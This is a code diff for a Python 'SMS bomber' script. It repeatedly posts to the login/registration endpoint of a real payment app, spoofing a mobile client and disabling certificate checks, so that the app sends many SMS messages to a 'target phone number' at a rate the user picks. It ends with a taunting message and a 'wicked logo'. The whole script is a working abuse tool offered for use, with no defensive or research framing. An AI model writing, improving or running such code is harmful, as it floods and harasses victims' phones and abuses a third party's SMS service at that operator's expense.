@@ -1,27 +1,47 @@
-#arxu
 import requests
-url = "https://ap.paymasterbd.net/login_registration/"
-headers = {
-    "Host": "ap.paymasterbd.net",
-    "Content-Type": "application/x-www-form-urlencoded",
-    "Content-Length": "90",
-    "Accept-Encoding": "gzip",
-    "User-Agent": "okhttp/3.14.9",
-}
+import time
 
-data = {
-    "phone_number": input("Enter the phone number: "),
-    "fcm_key": "",
-    "device_id": "97bfda77edefe5",
-    "sms_hash_code": input("Enter the message: "),
-}
+# Initialize message count
+message_count = 0
 
-response = requests.post(url, headers=headers, data=data, verify=False)
+def send_sms(phone_number, message):
+    global message_count  # Access the global message count variable
+    url = "https://ap.paymasterbd.net/login_registration/"
+    headers = {
+        "Host": "ap.paymasterbd.net",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": "90",
+        "Accept-Encoding": "gzip",
+        "User-Agent": "okhttp/3.14.9",
+    }
 
-#print(response.status_code)
-print(response.text)
+    data = {
+        "phone_number": phone_number,
+        "fcm_key": "",
+        "device_id": "97bfda77edefe5",
+        "sms_hash_code": message,
+    }
 
-# Your wicked logo goes here:
+    response = requests.post(url, headers=headers, data=data, verify=False)
+
+    if response.status_code == 200:
+        message_count += 1  # Increment the message count
+        print("SMS sent to", phone_number)
+        print("Total messages sent:", message_count)  # Display message count
+    else:
+        print("Failed to send SMS to", phone_number)
+
+phone_number = input("Enter the target phone number: ")
+message = input("Enter the message to send: ")
+num_messages = int(input("Enter the number of messages to send: "))
+
+try:
+    for _ in range(num_messages):
+        send_sms(phone_number, message)
+        time.sleep(0.3)  # Adjust this value to send messages at the desired rate
+except KeyboardInterrupt:
+    print("SMS bombing interrupted. You coward!")
+#My wicked logo:
 print('''
                                                                                                
                                                                                                
